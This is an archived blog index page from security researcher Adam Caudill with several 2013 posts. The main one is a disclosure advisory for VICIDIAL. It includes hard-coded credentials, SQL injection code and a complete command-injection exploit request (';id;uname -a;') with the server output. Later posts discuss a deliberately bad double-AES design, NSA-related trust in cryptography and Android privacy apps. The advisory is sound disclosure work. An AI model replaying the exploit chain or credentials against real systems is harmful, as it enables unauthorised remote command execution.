@@ -1,0 +1,791 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Adam Caudill</title>
+  <meta name="author" content="Adam Caudill">
+
+  
+  <meta name="description" content="Update: The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I&#8217;ve pointed out here. Please &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://adamcaudill.github.com/page/4">
+  <link href="/favicon.ico" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Adam Caudill" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="https://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link rel="openid.server" href="https://adamcaudill.com/MyID.config.php">
+<link rel="openid.delegate" href="https://adamcaudill.com/MyID.config.php">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-106942-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Adam Caudill</a></h1>
+  
+    <h2>Independent Security Researcher &amp; Software Developer</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:adamcaudill.github.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/archives/">Archives</a></li>
+  <li><a href="/about/">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/10/23/vicidial-multiple-vulnerabilities/">VICIDIAL: Multiple Vulnerabilities</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-23T02:20:00-04:00" pubdate data-updated="true">Oct 23<span>rd</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><em>Update:</em> The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I&#8217;ve pointed out here. Please make sure you are using the latest version available. If you aren&#8217;t sure if your instance is safe, contact your friendly local penetration tester to verify it&#8217;s secure as you expect it to be.</p>
+
+<p><em>Update:</em> The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468.</p>
+
+<h2>Background</h2>
+
+<p><a href="http://www.vicidial.org/vicidial.php">VICIDIAL</a> (a.k.a. Asterisk GUI client) is an open-source dialer built on top of the Asterisk PBX. It&#8217;s written in PHP, and has a significant number of security issues.</p>
+
+<p>In addition to the open-source project, the company behind VICIDIAL, <a href="http://www.vicidial.com/">The Vicidial Group</a>, also offers VICIDIAL in a hosted environment.</p>
+
+<p>At this time, the current release version <strong>is still vulnerable</strong>. Vendor reports hosted users are on a fixed version. Vendor proposed to release the OSS code in mid-July, as of October 23rd, no update or advisory has been released.</p>
+
+<p>After discussions with other researchers, I have made the decision that after waiting more than 140 days for a release, patches, or an advisory warning users, that the next responsible step is to disclose the issue publicly.</p>
+
+<p>This is not a decision I take lightly, but I believe at this point users of this application should understand the degree of risk involved, and have details so they can take action to minimize that risk.</p>
+
+<h2>Overview</h2>
+
+<p>Tested versions: 2.7RC1, 2.7, 2.8-403a; it is likely other versions are affected.</p>
+
+<p>There are three vulnerabilities that I will discuss here:</p>
+
+<ol>
+<li>Pre-Auth SQL Injection in <code>./apc/SCRIPT_multirecording_AJAX.php</code></li>
+<li>Hard-Coded User Credentials</li>
+<li>Command Injection in <code>./agc/manager_send.php</code></li>
+</ol>
+
+
+<p>There are pre and/or post authentication SQL injection flaws in nearly every file in the <code>./agc</code> directory. The web portion is split between <code>./agc</code> (which is the &#8216;agent&#8217; interface) and <code>./vicidial</code> (the administrative interface). My review did not include the <code>./vicidial</code> directory, though a quick glance indicates that there are likely many issues there as well.</p>
+
+<p>There are many other issues; from XSS to a possible DoS by allowing an attacker to write directly to a log file until the attacker has exhausted the free space on the server.</p>
+
+<p>There&#8217;s also <code>./vicidial_mysql_errors.txt</code> - it might be of interest as it contains query parameters.</p>
+
+<p>I will not document all of the issues that I&#8217;ve found; partly because I don&#8217;t want to take the time, and also because I feel bad for the team at OSVDB - hundreds of entries for the same application wouldn&#8217;t be fun.</p>
+
+<h2>Pre-Auth SQL Injection</h2>
+
+<p>This is your typical, boring, SQL injection:</p>
+
+<figure class='code'><figcaption><span>SCRIPT_multirecording_AJAX.php - Line 44 </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="nv">$stmt</span><span class="o">=</span><span class="s2">&quot;select campaign_rec_filename from vicidial_campaigns where campaign_id=&#39;</span><span class="si">$campaign</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>$campaign</code> variable is unsanitized and passed directly to the query. This isn&#8217;t the best SQL Injection ever, but it demonstrates the issue.</p>
+
+<h2>Hard-Coded User Credentials</h2>
+
+<p>There are two accounts that are created when you install VICIDIAL that have hard coded passwords, that are used by the software. While these accounts have minimal permissions, they do allow an attacker to get to portions of the code not accessible without a valid user account.</p>
+
+<p>Accounts:</p>
+
+<ul>
+<li>VDAD</li>
+<li>VDCL</li>
+</ul>
+
+
+<p>Both accounts have the same password: <code>donotedit</code>.</p>
+
+<h2>Command Injection</h2>
+
+<p>In multiple locations, there are calls to <code>passthru()</code> that do not perform any filtering or sanitization on the input. In this case, we are looking at <code>./agc/manager_send.php</code> line 429.</p>
+
+<p>Here is the code in question:</p>
+
+<figure class='code'><figcaption><span>manager_send.php </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$ACTION</span><span class="o">==</span><span class="s2">&quot;OriginateVDRelogin&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$enable_sipsak_messages</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$allow_sipsak_messages</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/SIP/i&quot;</span><span class="p">,</span><span class="nv">$protocol</span><span class="p">))</span> <span class="p">)</span>
+</span><span class='line'>      <span class="p">{</span>
+</span><span class='line'>      <span class="nv">$CIDdate</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;ymdHis&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="nv">$DS</span><span class="o">=</span><span class="s1">&#39;-&#39;</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$SIPSAK_prefix</span> <span class="o">=</span> <span class="s1">&#39;LIN-&#39;</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">print</span> <span class="s2">&quot;&lt;!-- sending login sipsak message: </span><span class="si">$SIPSAK_prefix$VD_campaign</span><span class="s2"> --&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;/usr/local/bin/sipsak -M -O desktop -B </span><span class="se">\&quot;</span><span class="si">$SIPSAK_prefix$campaign</span><span class="se">\&quot;</span><span class="s2"> -r 5060 -s sip:</span><span class="si">$extension</span><span class="s2">@</span><span class="si">$phone_ip</span><span class="s2"> &gt; /dev/null&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="nv">$queryCID</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$SIPSAK_prefix$campaign$DS$CIDdate</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$ACTION</span><span class="o">=</span><span class="s2">&quot;Originate&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To exploit this, the following values must be set:</p>
+
+<ul>
+<li><code>enable_sipsak_messages=1</code></li>
+<li><code>allow_sipsak_messages=1</code></li>
+<li><code>protocol=sip</code></li>
+<li><code>ACTION=OriginateVDRelogin</code></li>
+<li><code>session_name=AAAAAAAAAAAA</code> (or any other value at least 12 bytes long)</li>
+<li><code>server_ip=' OR '1' = '1</code></li>
+<li><code>user=VDCL</code></li>
+<li><code>pass=donotedit</code></li>
+</ul>
+
+
+<p>The payload is passed in the <code>extension</code> parameter, for my testing, I used the following:</p>
+
+<p><code>extension=;id;uname -a;</code></p>
+
+<p>As you&#8217;ve probably noticed, the value for <code>server_ip</code> isn&#8217;t just a dummy value, it&#8217;s taking advantage of a SQL Injection vulnerability on line 285:</p>
+
+<figure class='code'><figcaption><span>manager_send.php </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="nv">$stmt</span><span class="o">=</span><span class="s2">&quot;SELECT count(*) from web_client_sessions where session_name=&#39;</span><span class="si">$session_name</span><span class="s2">&#39; and server_ip=&#39;</span><span class="si">$server_ip</span><span class="s2">&#39;;&quot;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This allows us to bypass the check for an active session, and we use the hard coded credentials to get around the need for authentication.</p>
+
+<p>When you execute this, it looks like this:</p>
+
+<pre><code>GET http://192.168.10.131/agc/manager_send.php?enable_sipsak_messages=1&amp;allow_sipsak_messages=1&amp;protocol=sip&amp;ACTION=OriginateVDRelogin&amp;session_name=AAAAAAAAAAAA&amp;server_ip=%27%20OR%20%271%27%20%3D%20%271&amp;extension=%3Bid%3Buname%20-a%3B&amp;user=VDCL&amp;pass=donotedit HTTP/1.1
+User-Agent: Fiddler
+Host: 192.168.10.131
+
+--
+
+HTTP/1.1 200 OK
+Date: Sun, 02 Jun 2013 23:22:38 GMT
+Server: Apache/2.2.21 (Linux/SUSE)
+X-Powered-By: PHP/5.3.8
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 291
+Content-Type: text/html; charset=utf-8
+
+
+&lt;!-- sending login sipsak message: LIN- --&gt;
+uid=30(wwwrun) gid=8(www) groups=8(www)
+Linux linux-0y3h 3.1.10-1.23.1-pae #1 SMP Tue May 21 12:46:34 UTC 2013 (8645a72) i686 i686 i386 GNU/Linux
+ERROR Exten  is not valid or queryCID LIN--130602192238 is not valid, Originate command not inserted
+</code></pre>
+
+<p>As you can see, when you run this, the the returned text from the shell is included in the middle of the body in the server&#8217;s response.</p>
+
+<h2>Timeline &amp; Vendor Response</h2>
+
+<p>The vendor quickly acknowledged the issues and promised quick fixes. As time has gone on, their hosted users received the security fixes, users of the open-source version remain unaware of the issue and unprotected.</p>
+
+<ul>
+<li>6/3/2013 - Vendor notified</li>
+<li>6/3/2013 - Vendor confirmed</li>
+<li>6/13/2013 - Vendor states first phase of changes complete; began rolling out fixes to hosted users.</li>
+<li>6/15/2013 - Requested release timeline.</li>
+<li>6/15/2013 - Vendor requests disclosure delay till mid-July 2013.</li>
+<li>7/3/2013 - Vendor advises second phase of changes complete and being pushed to hosted users.</li>
+<li>8/26/2013 - Requested status update.</li>
+<li>8/27/2013 - Vendor advises final phase of changes complete, hosted users update with all security changes. Expects to release OSS code in two weeks.</li>
+<li>9/20/2013 - Requested status update.</li>
+<li>9/25/2013 - Vendor advises of unrelated delay. Expected to complete work for next release by 9/30.</li>
+<li>10/23/2013 - Decision made that further delays not in the public interest.</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/09/08/worried-about-the-nsa-try-aes-512/">Worried About the NSA? Try AES-512!</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-08T13:07:00-04:00" pubdate data-updated="true">Sep 8<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><em>[…or, The Cost of Wild Speculation]</em></p>
+
+<p>&#8220;We need to boost our security - I think the NSA has broken everything we use. AES-256 is too weak, I don&#8217;t trust it. Find a way to implement AES-512.&#8221;</p>
+
+<p>Double-AES-256! It&#8217;d be easy, and double encrypting has <a href="https://en.wikipedia.org/wiki/Meet-in-the-middle_attack">never bitten us</a> before. So, let&#8217;s write some code!</p>
+
+<figure class='code'><figcaption><span>AES-512 / Double-AES-256 - aes512.rb </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">e</span><span class="p">(</span><span class="n">e</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">31</span><span class="p">)),</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="mi">32</span><span class="o">.</span><span class="n">.</span><span class="mi">63</span><span class="p">))</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">d</span><span class="p">(</span><span class="n">d</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="mi">32</span><span class="o">.</span><span class="n">.</span><span class="mi">63</span><span class="p">)),</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">31</span><span class="p">))</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">e</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">aes</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">Cipher</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;AES-256-CBC&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">aes</span><span class="o">.</span><span class="n">encrypt</span>
+</span><span class='line'>  <span class="n">aes</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">key</span>
+</span><span class='line'>  <span class="n">aes</span><span class="o">.</span><span class="n">iv</span> <span class="o">=</span> <span class="n">iv</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="o">+</span> <span class="n">aes</span><span class="o">.</span><span class="n">final</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">d</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">aes</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">Cipher</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;AES-256-CBC&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">aes</span><span class="o">.</span><span class="n">decrypt</span>
+</span><span class='line'>  <span class="n">aes</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">key</span>
+</span><span class='line'>  <span class="n">aes</span><span class="o">.</span><span class="n">iv</span> <span class="o">=</span> <span class="n">iv</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span> <span class="o">+</span> <span class="n">aes</span><span class="o">.</span><span class="n">final</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This (somewhat) hypothetical conversation is becoming more common in the face of uncertainty and wild speculation. We have seen a glimpse into the greatest adversary that cryptography has. And we&#8217;ve learned almost nothing.</p>
+
+<p>We know they have attacks, but we don&#8217;t know against what. Is Diffie-Hellman broken? Is ECC backdoored? Has the <a href="https://en.wikipedia.org/wiki/RSA_problem">RSA problem</a> been solved? Or maybe they&#8217;ve only found a somewhat more efficient way to factor  RSA keys? I&#8217;ve also heard speculation that they&#8217;ve broken RC4. They might have backdoors in OpenSSL or Microsoft&#8217;s CAPI.</p>
+
+<p>We have no idea.</p>
+
+<p>Here&#8217;s what we do know, in the past, uncertainty and speculation drove adoption of snake-oil solutions. Flawed, nonsensical technologies that just did more harm than good. Speculation today risks driving people from something that&#8217;s safe, to tools that leave them fully exposed.</p>
+
+<p>It&#8217;s hard to give pragmatic advice in the face such uncertainty; but we must be cautious, we must not panic. I won&#8217;t accuse anyone of over-reacting, as what we have seen is startling to say the least - but there are bigger risks to consider.</p>
+
+<p>For example, let&#8217;s assume for just a moment that the NSA has, in fact, influenced the ECC specification to include curves with weaknesses known to itself. What are the risks?</p>
+
+<ol>
+<li>The NSA is able to decrypt messages at will.</li>
+<li>A well equipped adversary (say, another state funded group) could discover the flaw, and exploit it.</li>
+</ol>
+
+
+<p>Neither of those give me warm-fuzzies, but there are worse things: in the panic over &#8220;OMG - ECC is broken&#8221; people hastily switch to magic solutions that rely on obscurity and have no proven security, or to hastily implemented, poorly configured solutions that make them vulnerable to not only nation-state level adversaries, but much smaller ones as well.</p>
+
+<p>If in the panic over ECC one was to move to an RSA based system with weak keys - they are likely to be far more vulnerable than they would have been, had they done nothing at all.</p>
+
+<p>This of course applies to many scenarios, not just ECC - and personally, I trust ECC over RSA, at lease when using <a href="http://cr.yp.to/ecdh.html">curve25519</a> or other non-NSA supplied curves.</p>
+
+<p>There are no good answers to be found right now; all we can do is exercise caution and try to keep people from over-reacting and making their problems worse.</p>
+
+<p><em>[N.B. I realize that meet-in-the-middle isn&#8217;t practical against AES-256 with technology as we know it, but it had to be pointed out. Also, please, <strong>please</strong> don&#8217;t use the double AES-256 / AES-512 code. Really. Just don&#8217;t.]</em></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/09/07/crypto-the-nsa-and-broken-trust/">Crypto, the NSA, and Broken Trust</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-07T13:04:00-04:00" pubdate data-updated="true">Sep 7<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Even as a child I was fascinated by cryptography - and often left the local librarians with puzzled looks thanks to the books I would check out. It&#8217;s so elegantly simple, and yet massively complex. There is one very unusual property of crypto though - it&#8217;s not about math or modes, it&#8217;s about trust.</p>
+
+<p>Cryptography, especially as used today, has the most wonderful dichotomy of trust; on one hand crypto, by it&#8217;s very nature, is used in situations lacking trust. On the other hand, to use crypto - you have to trust <em>it</em>.</p>
+
+<p><strong>But what is <em>it</em>?</strong></p>
+
+<p>This is where it gets interesting - let&#8217;s say you download <a href="https://gpgtools.org/">GPGTools</a>, what is the chain of trust?</p>
+
+<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Has anyone verified that the GPGtools binaries match the source code in the git repo? Im suspicious of any binary distro encryption software</p>&mdash; the grugq  (@thegrugq) <a href="https://twitter.com/thegrugq/statuses/376323020945514497">September 7, 2013</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
+
+
+<p>Here are some of the assumptions you make:</p>
+
+<ul>
+<li>The installer hasn&#8217;t been tampered with by your ISP, their upstream providers, GPGTools&#8217; hosting company - all of this is before you even get to the people that publish the software! (And <a href="http://projects.wsj.com/surveillance-catalog/documents/267850-merged-finfly-isp/">we know</a> this is being done.)</li>
+<li>The computer that built the binaries was free of malware, or other backdoors.</li>
+<li>The source code hadn&#8217;t been modified, without the knowledge of the developers.</li>
+<li>The developers haven&#8217;t modified the code to add backdoors or otherwise weaken it.</li>
+<li>The compiler, and other libraries are free of backdoors or other modifications that would alter the resulting binaries.</li>
+</ul>
+
+
+<p>I could keep going, there&#8217;s more - but this gives an idea of how many things you have to trust, not just for every application - but every update of every application.</p>
+
+<p>You could compile everything yourself of course (if its&#8217; open source that is) - but that only eliminates some of these issues. You still have to trust the code, you still have to trust the developers.</p>
+
+<p>Well, you could audit the code. If you know what you&#8217;re doing - in a few weeks you might actually get to the point of installing it. Which of course there will be a new update by then.</p>
+
+<p><strong>Can&#8217;t we fix this?</strong></p>
+
+<p>Some of it, yes - maybe. The Tor project is working on <a href="https://blog.torproject.org/blog/deterministic-builds-part-one-cyberwar-and-global-compromise">deterministic builds</a>, which would allow others to verify that the released binary was built from a specific revision of the source code. This is really quite impressive, and something I truly applaud them for.</p>
+
+<p>But, that doesn&#8217;t lessen the trust you place in the developers and the code - is it actually secure? Are the even competent to be doing this work? Are there bugs in the PRNG or key negotiation that could render the system pointless? There&#8217;s still a level of trust required.</p>
+
+<p><strong>What about the standards?</strong></p>
+
+<p>We know that the government has sought to backdoor or weaken systems in the past - from things like the <a href="https://en.wikipedia.org/wiki/Clipper_chip">Clipper chip</a>; enforcing illogical <a href="https://en.wikipedia.org/wiki/Export_of_cryptography_in_the_United_States">export restrictions</a>, and trying to enact laws that <a href="https://www.eff.org/deeplinks/2013/05/caleatwo">mandate backdoors</a> (CALEA II). Now, we know that after losing the Crypto Wars of the past, they have been clandestinely doing the <a href="http://www.theguardian.com/world/2013/sep/05/nsa-gchq-encryption-codes-security">same things</a>.</p>
+
+<p>The single biggest things that you have to trust are the protocols and algorithms - they are the most complicated, and only a very small number of people are qualified to audit them. If the protocol has deliberate flaws, or there is a backdoor in the algorithm - then your efforts to encrypt may be for nothing.</p>
+
+<p><strong>It&#8217;s all about trust</strong></p>
+
+<p>I&#8217;m a big fan of taking the &#8220;trust no one&#8221; position (and myself least of all), but in the world of cryptography - it&#8217;s not that easy. Every step of the way you have to trust something.</p>
+
+<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p><a href="https://twitter.com/gentmatt">@gentmatt</a> way to miss the point. &quot;Trust, but verify&quot;. The time for verification has come.</p>&mdash; the grugq  (@thegrugq) <a href="https://twitter.com/thegrugq/statuses/376328406419243008">September 7, 2013</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
+
+
+<p>Some say, &#8220;trust but verify&#8221; - and I agree, but full verification is a dream that will never come true. There aren&#8217;t enough qualified eyes, and there is far too much code involved.</p>
+
+<p>With so many dependencies, so many places something malicious could be injected - it&#8217;s almost overwhelming to think about. In my eyes though, the first, and most important step, is helping people to understand the chain of trust. If you understand what you are trusting, you can ask better questions.</p>
+
+<p>There is no real answer here - this is simply how it is. If you use cryptography (and you aren&#8217;t a true cryptographer), then you&#8217;re taking a leap of faith. If you didn&#8217;t compile all of the tools you use - it&#8217;s an even bigger leap.</p>
+
+<p><em>[N.B. This article was planned before the <a href="http://www.theguardian.com/world/2013/sep/05/nsa-gchq-encryption-codes-security">Bullrun</a> story broke; but in light of these recent events, I&#8217;ve updated and published this ahead of schedule.]</em></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/09/06/making-android-nsa-proof/">Making Android NSA-Proof</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-06T23:34:00-04:00" pubdate data-updated="true">Sep 6<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>As it turns out, it&#8217;s quite easy to make your Android phone NSA-proof. It&#8217;s a simple method, and anyone can do it - all you need is a few ounces of thermite!</p>
+
+<p><a href="https://secure.flickr.com/photos/pkh/578831120/"><img class="center" src="https://farm2.staticflickr.com/1341/578831120_8ee93c49af.jpg"></a></p>
+
+<p>Too extreme?</p>
+
+<p>Let&#8217;s shoot for something a little more attainable - spy resistant. We can&#8217;t stop every attack, but we can reduce the attack surface a bit. Here are a few tools that I&#8217;ve been using recently to do just that.</p>
+
+<p><strong><a href="https://www.boxcryptor.com/en/boxcryptor-classic">Boxcryptor Classic</a></strong> - Like many people, I use DropBox for certain, low sensitivity files. But what about things that require a little more care? Boxcryptor Classic encrypts files and then stores the encrypted copy in DropBox. It&#8217;s simple, security seems sound, and the free edition is quite adequate. May not be perfect, but suits my needs nicely.</p>
+
+<p><strong><a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms">TextSecure</a></strong> - It&#8217;s <a href="https://github.com/WhisperSystems/TextSecure/">open-source</a>, it&#8217;s free, and it&#8217;s from <a href="https://twitter.com/moxie">Moxie</a> - what&#8217;s not to love? It stores all of your SMS &amp; MMS data encrypted, and can encrypt the data over the air when texting another TextSecure user.</p>
+
+<p>Currently it uses the SMS/MMS service for messaging, and is Android only; both of those things are changing soon. It&#8217;ll be using the <a href="https://whispersystems.org/blog/asynchronous-security/">data channel</a> and supporting <a href="https://whispersystems.org/blog/iphone-rsn/">iOS</a> in the near future.</p>
+
